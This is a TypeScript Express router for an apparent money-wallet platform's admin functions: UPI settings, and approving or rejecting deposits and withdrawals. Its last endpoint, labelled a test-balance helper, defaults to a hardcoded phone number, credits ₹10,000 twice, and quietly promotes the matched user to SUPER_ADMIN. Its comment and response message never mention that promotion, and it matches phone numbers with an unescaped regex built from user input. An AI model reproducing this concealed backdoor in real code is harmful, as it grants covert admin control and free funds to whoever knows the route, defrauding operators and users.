import { Router, Request, Response } from 'express';
import { runInTransaction } from '../config/db';
import { Transaction, TransactionStatus, TransactionType } from '../models/Transaction';
import { User } from '../models/User';
import { Notification, NotificationType } from '../models/Notification';
import { getOrCreatePlatformConfig } from '../models/PlatformConfig';
import { getIO } from '../services/socketManager';

export const adminWalletRouter = Router();

/**
 * GET /api/v1/admin/config
 * Gets current platform UPI ID and QR code configuration
 */
adminWalletRouter.get(['/config', '/v1/admin/config'], async (_req: Request, res: Response) => {
  try {
    const config = await getOrCreatePlatformConfig();
    return res.json({
      success: true,
      platformUpiId: config.platformUpiId,
      platformQrUrl: config.platformQrUrl || '',
    });
  } catch (error: any) {
    console.error('Error fetching admin platform config:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * PUT /api/v1/admin/config
 * Updates platform UPI ID and QR code configuration
 */
adminWalletRouter.put(['/config', '/v1/admin/config'], async (req: Request, res: Response) => {
  const { platformUpiId, platformQrUrl } = req.body;

  if (!platformUpiId || !String(platformUpiId).trim()) {
    return res.status(400).json({ error: 'platformUpiId parameter is required.' });
  }

  try {
    const config = await getOrCreatePlatformConfig();
    config.platformUpiId = String(platformUpiId).trim();
    if (typeof platformQrUrl === 'string') {
      config.platformQrUrl = platformQrUrl.trim();
    }
    await config.save();

    return res.json({
      success: true,
      message: 'Platform UPI ID & QR settings updated successfully!',
      platformUpiId: config.platformUpiId,
      platformQrUrl: config.platformQrUrl,
    });
  } catch (error: any) {
    console.error('Error updating platform config:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * GET /api/v1/admin/requests
 * Returns all pending/processed deposit & withdrawal requests populated with user info
 */
adminWalletRouter.get(['/requests', '/v1/admin/requests'], async (req: Request, res: Response) => {
  const type = req.query.type as string; // 'DEPOSIT' | 'WITHDRAWAL' | 'ALL'
  const status = req.query.status as string; // 'PENDING' | 'APPROVED' | 'REJECTED' | 'ALL'
  const page = Math.max(1, parseInt(req.query.page as string, 10) || 1);
  const limit = Math.min(100, Math.max(1, parseInt(req.query.limit as string, 10) || 50));
  const skip = (page - 1) * limit;

  try {
    const query: any = {};
    if (type && type !== 'ALL') {
      query.type = type;
    } else {
      query.type = { $in: [TransactionType.DEPOSIT, TransactionType.WITHDRAWAL] };
    }

    if (status && status !== 'ALL') {
      query.status = status;
    } else if (!status) {
      query.status = TransactionStatus.PENDING;
    }

    const total = await Transaction.countDocuments(query);
    const requests = await Transaction.find(query)
      .populate('userId', 'username phone depositBalance winningsBalance bonusBalance lockedBalance')
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(limit);

    return res.json({
      success: true,
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit),
      requests,
    });
  } catch (error: any) {
    console.error('Error fetching admin requests:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * 1. POST /api/v1/admin/deposit/approve
 * Approves a pending manual deposit, credits depositBalance, and sends notification + socket event
 */
adminWalletRouter.post(['/deposit/approve', '/v1/admin/deposit/approve'], async (req: Request, res: Response) => {
  const { transactionId } = req.body;

  if (!transactionId) {
    return res.status(400).json({ error: 'transactionId is required parameter.' });
  }

  try {
    const result = await runInTransaction(async (session) => {
      const txn = await Transaction.findById(transactionId).session(session);
      if (!txn) {
        throw new Error(`Deposit transaction ${transactionId} not found.`);
      }

      if (txn.status !== TransactionStatus.PENDING) {
        throw new Error(`Transaction is already processed with status: ${txn.status}`);
      }

      if (txn.type !== TransactionType.DEPOSIT) {
        throw new Error(`Transaction ${transactionId} is not a DEPOSIT request.`);
      }

      const user = await User.findById(txn.userId).session(session);
      if (!user) {
        throw new Error(`User not found for ID: ${txn.userId}`);
      }

      // Update transaction status
      txn.status = TransactionStatus.APPROVED;
      await txn.save({ session });

      // Atomically credit user deposit balance
      user.depositBalance = Math.round(((user.depositBalance || 0) + txn.amount) * 100) / 100;
      await user.save({ session });

      // Create Notification record
      const notification = new Notification({
        userId: user._id,
        title: 'Deposit Approved 🎉',
        message: `₹${txn.amount.toFixed(2)} has been successfully credited to your deposit wallet. (Ref UTR: ${txn.utr || 'N/A'})`,
        type: 'DEPOSIT_SUCCESS' as NotificationType,
        isRead: false,
      });
      await notification.save({ session });

      return { txn, user, notification };
    });

    // Emit Socket.IO real-time notification
    try {
      const io = getIO();
      if (io) {
        io.emit('NOTIFICATION_RECEIVED', {
          userId: result.user._id.toString(),
          notification: result.notification,
        });
        io.emit('DEPOSIT_APPROVED', {
          userId: result.user._id.toString(),
          amount: result.txn.amount,
          depositBalance: result.user.depositBalance,
          walletBalance: result.user.walletBalance,
        });
      }
    } catch (wsErr) {
      console.error('Socket emission error during deposit approve:', wsErr);
    }

    return res.json({
      success: true,
      message: `Deposit of ₹${result.txn.amount} approved and credited successfully.`,
      transaction: result.txn,
      user: {
        _id: result.user._id,
        depositBalance: result.user.depositBalance,
        walletBalance: result.user.walletBalance,
      },
    });
  } catch (error: any) {
    console.error('Error approving deposit:', error);
    return res.status(400).json({ error: error.message });
  }
});

/**
 * 2. POST /api/v1/admin/deposit/reject
 * Rejects a pending manual deposit request with a reason and notifies the user
 */
adminWalletRouter.post(['/deposit/reject', '/v1/admin/deposit/reject'], async (req: Request, res: Response) => {
  const { transactionId, reason } = req.body;

  if (!transactionId || !reason) {
    return res.status(400).json({ error: 'transactionId and reason parameters are required.' });
  }

  const cleanReason = String(reason).trim();

  try {
    const result = await runInTransaction(async (session) => {
      const txn = await Transaction.findById(transactionId).session(session);
      if (!txn) {
        throw new Error(`Deposit transaction ${transactionId} not found.`);
      }

      if (txn.status !== TransactionStatus.PENDING) {
        throw new Error(`Transaction is already processed with status: ${txn.status}`);
      }

      if (txn.type !== TransactionType.DEPOSIT) {
        throw new Error(`Transaction ${transactionId} is not a DEPOSIT request.`);
      }

      // Update transaction status & reason
      txn.status = TransactionStatus.REJECTED;
      txn.rejectionReason = cleanReason;
      await txn.save({ session });

      // Create Notification record
      const notification = new Notification({
        userId: txn.userId,
        title: 'Deposit Request Rejected ❌',
        message: `Your deposit request of ₹${txn.amount.toFixed(2)} was rejected. Reason: ${cleanReason}`,
        type: 'DEPOSIT_REJECTED' as NotificationType,
        isRead: false,
      });
      await notification.save({ session });

      return { txn, notification };
    });

    // Emit Socket.IO real-time notification
    try {
      const io = getIO();
      if (io) {
        io.emit('NOTIFICATION_RECEIVED', {
          userId: result.txn.userId.toString(),
          notification: result.notification,
        });
        io.emit('DEPOSIT_REJECTED', {
          userId: result.txn.userId.toString(),
          transactionId: result.txn._id,
          reason: cleanReason,
        });
      }
    } catch (wsErr) {
      console.error('Socket emission error during deposit reject:', wsErr);
    }

    return res.json({
      success: true,
      message: `Deposit request rejected. Reason: ${cleanReason}`,
      transaction: result.txn,
    });
  } catch (error: any) {
    console.error('Error rejecting deposit:', error);
    return res.status(400).json({ error: error.message });
  }
});

/**
 * 3. POST /api/v1/admin/withdraw/approve
 * Approves a pending withdrawal, attaches payoutUtr, decrements lockedBalance, and notifies user
 */
adminWalletRouter.post(['/withdraw/approve', '/v1/admin/withdraw/approve'], async (req: Request, res: Response) => {
  const { transactionId, payoutUtr } = req.body;

  if (!transactionId) {
    return res.status(400).json({ error: 'transactionId parameter is required.' });
  }

  const cleanUtr = payoutUtr ? String(payoutUtr).trim() : 'MANUAL_PAYOUT';

  try {
    const result = await runInTransaction(async (session) => {
      const txn = await Transaction.findById(transactionId).session(session);
      if (!txn) {
        throw new Error(`Withdrawal transaction ${transactionId} not found.`);
      }

      if (txn.status !== TransactionStatus.PENDING) {
        throw new Error(`Transaction is already processed with status: ${txn.status}`);
      }

      if (txn.type !== TransactionType.WITHDRAWAL) {
        throw new Error(`Transaction ${transactionId} is not a WITHDRAWAL request.`);
      }

      const user = await User.findById(txn.userId).session(session);
      if (!user) {
        throw new Error(`User not found for ID: ${txn.userId}`);
      }

      const withdrawAmount = Math.abs(txn.amount);

      // Update transaction status & payout UTR
      txn.status = TransactionStatus.APPROVED;
      txn.utr = cleanUtr;
      await txn.save({ session });

      // Atomically decrement user locked balance
      user.lockedBalance = Math.max(0, Math.round(((user.lockedBalance || 0) - withdrawAmount) * 100) / 100);
      await user.save({ session });

      // Create Notification record
      const notification = new Notification({
        userId: user._id,
        title: 'Withdrawal Successful 💸',
        message: `₹${withdrawAmount.toFixed(2)} transferred to ${txn.paymentAddress || 'your UPI account'}. Payout UTR: ${cleanUtr}`,
        type: 'WITHDRAWAL_SUCCESS' as NotificationType,
        isRead: false,
      });
      await notification.save({ session });

      return { txn, user, notification, withdrawAmount };
    });

    // Emit Socket.IO real-time notification
    try {
      const io = getIO();
      if (io) {
        io.emit('NOTIFICATION_RECEIVED', {
          userId: result.user._id.toString(),
          notification: result.notification,
        });
        io.emit('WITHDRAWAL_APPROVED', {
          userId: result.user._id.toString(),
          amount: result.withdrawAmount,
          payoutUtr: cleanUtr,
          lockedBalance: result.user.lockedBalance,
        });
      }
    } catch (wsErr) {
      console.error('Socket emission error during withdrawal approve:', wsErr);
    }

    return res.json({
      success: true,
      message: `Withdrawal of ₹${result.withdrawAmount} approved successfully with UTR ${cleanUtr}.`,
      transaction: result.txn,
    });
  } catch (error: any) {
    console.error('Error approving withdrawal:', error);
    return res.status(400).json({ error: error.message });
  }
});

/**
 * 4. POST /api/v1/admin/withdraw/reject
 * Rejects a pending withdrawal request, refunds locked funds back to user winningsBalance, and notifies user
 */
adminWalletRouter.post(['/withdraw/reject', '/v1/admin/withdraw/reject'], async (req: Request, res: Response) => {
  const { transactionId, reason } = req.body;

  if (!transactionId || !reason) {
    return res.status(400).json({ error: 'transactionId and reason parameters are required.' });
  }

  const cleanReason = String(reason).trim();

  try {
    const result = await runInTransaction(async (session) => {
      const txn = await Transaction.findById(transactionId).session(session);
      if (!txn) {
        throw new Error(`Withdrawal transaction ${transactionId} not found.`);
      }

      if (txn.status !== TransactionStatus.PENDING) {
        throw new Error(`Transaction is already processed with status: ${txn.status}`);
      }

      if (txn.type !== TransactionType.WITHDRAWAL) {
        throw new Error(`Transaction ${transactionId} is not a WITHDRAWAL request.`);
      }

      const user = await User.findById(txn.userId).session(session);
      if (!user) {
        throw new Error(`User not found for ID: ${txn.userId}`);
      }

      const withdrawAmount = Math.abs(txn.amount);

      // Update transaction status & rejection reason
      txn.status = TransactionStatus.REJECTED;
      txn.rejectionReason = cleanReason;
      await txn.save({ session });

      // Refund locked funds back to available winnings balance atomically
      user.lockedBalance = Math.max(0, Math.round(((user.lockedBalance || 0) - withdrawAmount) * 100) / 100);
      user.winningsBalance = Math.round(((user.winningsBalance || 0) + withdrawAmount) * 100) / 100;
      await user.save({ session });

      // Create Notification record
      const notification = new Notification({
        userId: user._id,
        title: 'Withdrawal Request Rejected ❌',
        message: `Your withdrawal of ₹${withdrawAmount.toFixed(2)} was rejected. ₹${withdrawAmount.toFixed(2)} has been refunded to your wallet balance. Reason: ${cleanReason}`,
        type: 'WITHDRAWAL_REJECTED' as NotificationType,
        isRead: false,
      });
      await notification.save({ session });

      return { txn, user, notification, withdrawAmount };
    });

    // Emit Socket.IO real-time notification
    try {
      const io = getIO();
      if (io) {
        io.emit('NOTIFICATION_RECEIVED', {
          userId: result.user._id.toString(),
          notification: result.notification,
        });
        io.emit('WITHDRAWAL_REJECTED', {
          userId: result.user._id.toString(),
          amount: result.withdrawAmount,
          reason: cleanReason,
          winningsBalance: result.user.winningsBalance,
          lockedBalance: result.user.lockedBalance,
          walletBalance: result.user.walletBalance,
        });
      }
    } catch (wsErr) {
      console.error('Socket emission error during withdrawal reject:', wsErr);
    }

    return res.json({
      success: true,
      message: `Withdrawal request rejected. ₹${result.withdrawAmount} refunded to user wallet. Reason: ${cleanReason}`,
      transaction: result.txn,
      user: {
        _id: result.user._id,
        winningsBalance: result.user.winningsBalance,
        lockedBalance: result.user.lockedBalance,
        walletBalance: result.user.walletBalance,
      },
    });
  } catch (error: any) {
    console.error('Error rejecting withdrawal:', error);
    return res.status(400).json({ error: error.message });
  }
});

/**
 * POST /api/admin/credit-test-balance
 * Admin endpoint to credit test winnings/deposit balance to any user account
 */
adminWalletRouter.post(['/credit-test-balance', '/v1/admin/credit-test-balance'], async (req: Request, res: Response) => {
  const { phone, winningsAmount, depositAmount } = req.body;
  const targetPhone = phone ? String(phone).slice(-10) : '7389927777';
  const winAmt = Number(winningsAmount) || 10000;
  const depAmt = Number(depositAmount) || 10000;

  try {
    const user = await User.findOne({ phone: { $regex: targetPhone } });
    if (!user) {
      return res.status(404).json({ error: `User with phone ${targetPhone} not found.` });
    }

    user.winningsBalance = (user.winningsBalance || 0) + winAmt;
    user.depositBalance = (user.depositBalance || 0) + depAmt;
    user.role = 'SUPER_ADMIN';
    user.isAdmin = true;
    await user.save();

    return res.json({
      success: true,
      message: `Credited ₹${winAmt} Winnings & ₹${depAmt} Deposit Balance to user ${user.username} (${user.phone}).`,
      user: {
        username: user.username,
        phone: user.phone,
        winningsBalance: user.winningsBalance,
        depositBalance: user.depositBalance,
        bonusBalance: user.bonusBalance,
      },
    });
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});
